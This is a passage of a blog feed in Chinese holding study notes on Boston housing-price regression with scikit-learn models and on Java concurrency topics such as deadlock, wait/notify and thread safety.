        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_boston</span><br></pre></td></tr></table></figure><h1 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h1><ul><li><strong>查看数据&amp;处理数据</strong></li></ul><p><img src="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215142801183.png" class="lazyload" data-srcset="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215142801183.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211215142801183"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=load_boston().data</span><br><span class="line">y=load_boston().target</span><br><span class="line">y=y[:,np.newaxis] <span class="comment">#将y升高一个维度</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>数据归一化流程</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line">ss_x = StandardScaler()</span><br><span class="line">X_train = ss_x.fit_transform(X)</span><br><span class="line">ss_y = StandardScaler()</span><br><span class="line">y_train = ss_y.fit_transform(y)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>划分数据集合</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X_train, X_test, y_train, y_test = train_test_split(X_train, y_train, test_size=<span class="number">0.2</span>, random_state=<span class="number">888</span>)</span><br></pre></td></tr></table></figure></li></ul><h1 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linear_model = LinearRegression()</span><br><span class="line">linear_model.fit(X_train, y_train)</span><br><span class="line">coef = linear_model.coef_<span class="comment">#回归系数</span></span><br><span class="line">line_pre = linear_model.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SCORE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(linear_model.score(X_test, y_test)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;RMSE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(np.sqrt(mean_squared_error(y_test, line_pre))))</span><br></pre></td></tr></table></figure><p>运行结果：<img src="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215153341119.png" class="lazyload" data-srcset="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215153341119.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211215153341119" style="zoom: 80%;"></p><h1 id="其他模型"><a href="#其他模型" class="headerlink" title="其他模型"></a>其他模型</h1><h2 id="GradientBoosting（梯度提升）"><a href="#GradientBoosting（梯度提升）" class="headerlink" title="GradientBoosting（梯度提升）"></a>GradientBoosting（梯度提升）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> ensemble</span><br><span class="line">clf = ensemble.GradientBoostingRegressor()</span><br><span class="line">clf.fit(X_train, y_train)</span><br><span class="line">clf_pre=clf.predict(X_test) <span class="comment">#预测值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SCORE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(clf.score(X_test, y_test)))<span class="comment">#模型评分</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;RMSE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(np.sqrt(mean_squared_error(y_test, clf_pre))))<span class="comment">#RMSE(标准误差)</span></span><br></pre></td></tr></table></figure><p>运行结果：<img src="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215153518223.png" class="lazyload" data-srcset="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215153518223.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211215153518223" style="zoom:80%;"></p><h2 id="Lasso-回归-（Least-Absolute-Shrinkage-and-Selection-Operator）"><a href="#Lasso-回归-（Least-Absolute-Shrinkage-and-Selection-Operator）" class="headerlink" title="Lasso 回归 （Least Absolute Shrinkage and Selection Operator）"></a><strong>Lasso 回归 （Least Absolute Shrinkage and Selection Operator）</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score <span class="keyword">as</span> r2, mean_squared_error <span class="keyword">as</span> mse, mean_absolute_error <span class="keyword">as</span> mae</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"></span><br><span class="line">lasso = Lasso()</span><br><span class="line">lasso.fit(X_train,y_train)</span><br><span class="line">y_predict_lasso = lasso.predict(X_test)</span><br><span class="line">r2_score_lasso = r2(y_test,y_predict_lasso)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SCORE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>( lasso.score(X_test, y_test)))<span class="comment">#模型评分</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;RMSE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(np.sqrt(mean_squared_error(y_test,y_predict_lasso))))<span class="comment">#RMSE(标准误差)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Lasso模型的R-squared值为:&#x27;</span>,r2_score_lasso)</span><br></pre></td></tr></table></figure><h2 id="Support-Vector-Regression-SVR"><a href="#Support-Vector-Regression-SVR" class="headerlink" title="Support Vector Regression (SVR)"></a>Support Vector Regression (SVR)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVR</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix, classification_report</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score <span class="keyword">as</span> r2, mean_squared_error <span class="keyword">as</span> mse, mean_absolute_error <span class="keyword">as</span> mae</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">svr_model</span>(<span class="params">kernel</span>):</span></span><br><span class="line">    svr = SVR(kernel=kernel) </span><br><span class="line">    svr.fit(X_train, y_train)</span><br><span class="line">    y_predict = svr.predict(X_test)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># score(): Returns the coefficient of determination R^2 of the prediction.</span></span><br><span class="line">    <span class="built_in">print</span>(kernel,<span class="string">&#x27; SVR的默认衡量评估值值为：&#x27;</span>, svr.score(X_test,y_test))</span><br><span class="line">    <span class="built_in">print</span>(kernel,<span class="string">&#x27; SVR的R-squared值为：&#x27;</span>, r2(y_test, y_predict))</span><br><span class="line">    <span class="built_in">print</span>(kernel,<span class="string">&#x27; SVR的均方误差（mean squared error）为：&#x27;</span>,mse(y_test, y_predict))</span><br><span class="line">    <span class="built_in">print</span>(kernel,<span class="string">&#x27; SVR的平均绝对误差（mean absolute error）为：&#x27;</span>,mae(y_test,y_predict))</span><br><span class="line">    <span class="comment"># print(kernel,&#x27; SVR的均方误差（mean squared error）为：&#x27;,mse(scalery.inverse_transform(y_test), scalery.inverse_transform(y_predict)))</span></span><br><span class="line">    <span class="comment"># print(kernel,&#x27; SVR的平均绝对误差（mean absolute error）为：&#x27;,mae(scalery.inverse_transform(y_test),scalery.inverse_transform(y_predict)))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> svr</span><br><span class="line">    </span><br><span class="line">linear_svr = svr_model(kernel=<span class="string">&#x27;linear&#x27;</span>)  <span class="comment">#线性核函数</span></span><br><span class="line">poly_svr = svr_model(kernel=<span class="string">&#x27;poly&#x27;</span>)  <span class="comment">#多项式核</span></span><br><span class="line">rbf_svr = svr_model(kernel=<span class="string">&#x27;rbf&#x27;</span>)  <span class="comment">#径向基函数</span></span><br></pre></td></tr></table></figure><p>运行结果：<img src="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215154026880.png" class="lazyload" data-srcset="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215154026880.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211215154026880" style="zoom:50%;"></p><h2 id="SVM（支持向量机）回归–-线性核"><a href="#SVM（支持向量机）回归–-线性核" class="headerlink" title="SVM（支持向量机）回归– 线性核"></a>SVM（支持向量机）回归– 线性核</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.svm import SVR</span><br><span class="line">linear_svr = SVR(kernel=&quot;linear&quot;)</span><br><span class="line">linear_svr.fit(X_train, y_train)</span><br><span class="line">linear_svr_pre = linear_svr.predict(X_test)#预测值</span><br><span class="line">print(&#x27;SCORE:&#123;:.4f&#125;&#x27;.format(linear_svr.score(X_test, y_test)))#模型评分</span><br><span class="line">print(&#x27;RMSE:&#123;:.4f&#125;&#x27;.format(np.sqrt(mean_squared_error(y_test, linear_svr_pre))))#RMSE(标准误差)</span><br></pre></td></tr></table></figure><p>运行结果：<img src="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215153952414.png" class="lazyload" data-srcset="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215153952414.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211215153952414" style="zoom:80%;"></p><h2 id="决策树回归"><a href="#决策树回归" class="headerlink" title="决策树回归"></a>决策树回归</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeRegressor tree_reg=DecisionTreeRegressor(max_depth=<span class="number">2</span>) tree_reg.fit(X_train, y_train) tree_reg_pre = tree_reg.predict(X_test)<span class="comment">#预测值 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SCORE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>( tree_reg.score(X_test, y_test)))<span class="comment">#模型评分 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;RMSE:&#123;:.4f&#125;&#x27;</span>.<span class="built_in">format</span>(np.sqrt(mean_squared_error(y_test,tree_reg_pre))))</span><br><span class="line"><span class="comment">#RMSE(标准误差)</span></span><br></pre></td></tr></table></figure><p>结果：<img src="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215154253539.png" class="lazyload" data-srcset="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/image-20211215154253539.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211215154253539" style="zoom:80%;"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-并发：线程状态的转换</title>
      <link href="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E8%BD%AC%E6%8D%A2/"/>
      <url>/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E8%BD%AC%E6%8D%A2/image-20211214210200473.png" class="lazyload" data-srcset="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E8%BD%AC%E6%8D%A2/image-20211214210200473.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214210200473"></p><h1 id="死锁："><a href="#死锁：" class="headerlink" title="死锁："></a>死锁：</h1><h2 id="死锁产生条件："><a href="#死锁产生条件：" class="headerlink" title="死锁产生条件："></a>死锁产生条件：</h2><ul><li>互斥条件</li><li>请求与保持条件（一个进程因请求资源而阻塞时，对已获得的资源保持不变）</li><li>不剥夺条件（线程已获得的资源在未使用完之前不能被其他线程强行剥夺，只有自己使用完毕才释放)</li><li>循环等待条件</li></ul><h2 id="避免死锁："><a href="#避免死锁：" class="headerlink" title="避免死锁："></a>避免死锁：</h2><ul><li><strong>破坏请求与保持条件</strong> ：一次性申请所有的资源。</li><li><strong>破坏不剥夺条件</strong> ：占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源。</li><li><strong>破坏循环等待条件</strong> ：靠按序申请资源来预防。按某一顺序申请资源，释放资源则反序释放。破坏循环等待条件。</li></ul><h2 id="安全状态："><a href="#安全状态：" class="headerlink" title="安全状态："></a>安全状态：</h2><p><strong>安全状态</strong> 指的是系统能够按照某种进程推进顺序（P1、P2、P3…..Pn）来为每个进程分配所需资源，直到满足每个进程对资源的最大需求，使每个进程都可顺利完成。称&lt;P1、P2、P3…..Pn&gt;序列为安全序列。 —– 著作权归Guide哥所有。 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-并发：wait/notify</title>
      <link href="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/"/>
      <url>/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/</url>
      
        <content type="html"><![CDATA[<h1 id="wait-notify原理"><a href="#wait-notify原理" class="headerlink" title="wait/notify原理"></a>wait/notify原理</h1><img src="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214171557687.png" class="lazyload" data-srcset="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214171557687.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214171557687" style="zoom:150%;"><h1 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h1><ul><li>obj.wait( )让进入object的monitor线程到waitSet等待</li><li>obj.notify( )在object正在waitSet等待线程中挑一个唤醒</li><li>obj.notifyAll( )让object上正在waitSet等待的线程全部唤醒</li></ul><p>由于都是线程之间进行协作的手段，都属于Object对象的方法，必须获得obj对象的锁，才能调用</p><h1 id="wait-notify使用"><a href="#wait-notify使用" class="headerlink" title="wait/notify使用"></a>wait/notify使用</h1><h2 id="sleep与wait区别"><a href="#sleep与wait区别" class="headerlink" title="sleep与wait区别"></a>sleep与wait区别</h2><ol><li><p>sleep是Thread方法，wait是Object方法；</p></li><li><p>sleep不需要强制和synchronized使用，但wait需要和synchronized一起使用</p></li><li><p><strong>sleep在睡眠，不会释放对象锁，但wait在等待的时候会释放对象锁</strong></p></li><li><p>线程状态一样TIMED_WAITING</p></li></ol><h2 id="CODE"><a href="#CODE" class="headerlink" title="CODE"></a>CODE</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">boolean</span> is_true=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    sychronized(lock)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!is_true)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                lock.wait();</span><br><span class="line">            &#125;<span class="keyword">catch</span>()&#123;</span><br><span class="line">                `````</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//do something;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(lock)&#123;</span><br><span class="line">        is_true=<span class="keyword">true</span>;</span><br><span class="line">        lock.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure><h1 id="wait-notify-amp-park-unpark"><a href="#wait-notify-amp-park-unpark" class="headerlink" title="wait/notify&amp;park/unpark"></a>wait/notify&amp;park/unpark</h1><ul><li>wait，notify和notifyAll必须配合Object Monitor一起使用，而unpark不用；</li><li>park&amp;unpark是以明确某个线程为单位来阻塞或唤醒线程，而notify随机；</li><li>park&amp;unpark顺序可以随意，而notify智能在wait之后调用</li></ul><h2 id="先park后unpark"><a href="#先park后unpark" class="headerlink" title="先park后unpark"></a>先park后unpark</h2><p><img src="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214194358370.png" class="lazyload" data-srcset="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214194358370.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214194358370"></p><p><img src="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214194416176.png" class="lazyload" data-srcset="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214194416176.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214194416176"></p><h2 id="先unpark后park"><a href="#先unpark后park" class="headerlink" title="先unpark后park"></a>先unpark后park</h2><p><img src="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214194544607.png" class="lazyload" data-srcset="/2021/12/14/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9Await-notify/image-20211214194544607.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214194544607"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-并发：线程安全</title>
      <link href="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/"/>
      <url>/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h1><p>当多个线程同时访问一个对象时，如果不考虑这些线<strong>程在运行时环境下的调度和交替执行</strong>，也不需要<strong>额外的同步</strong>或者在调用访问进行任何<strong>其他的协调操作</strong>，调用这个对象的行为都可以获得正确结果，即称线程安全。</p><h1 id="线程对立"><a href="#线程对立" class="headerlink" title="线程对立"></a>线程对立</h1><p>线程对立是指不管调用端是否采取了同步的措施，都无法在多线程环境中并发使用代码。</p><p>一个线程对立的例子是Thread例子中的<code>suspend()</code>和<code>resume()</code>；如果两个线程同时持有一个线程对象，一个尝试中断，一个尝试回复，在并发情况下，假设<code>suspend()</code>中断的线程就是即将要执行<code>resume()</code>的那个线程，就要产生死锁。</p><h1 id="竞态条件"><a href="#竞态条件" class="headerlink" title="竞态条件"></a>竞态条件</h1><p>多个线程在临界区内执行，由于代码的执行序列不同而导致结果无法预测，为发送了竞态条件，导致竞态条件发生的代码称做临界区</p><p><strong>避免竞态条件</strong></p><ul><li>阻塞式的解决方案：synchronized，Lock</li><li>非阻塞式的解决方案：原子变量</li></ul><p><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95.png" 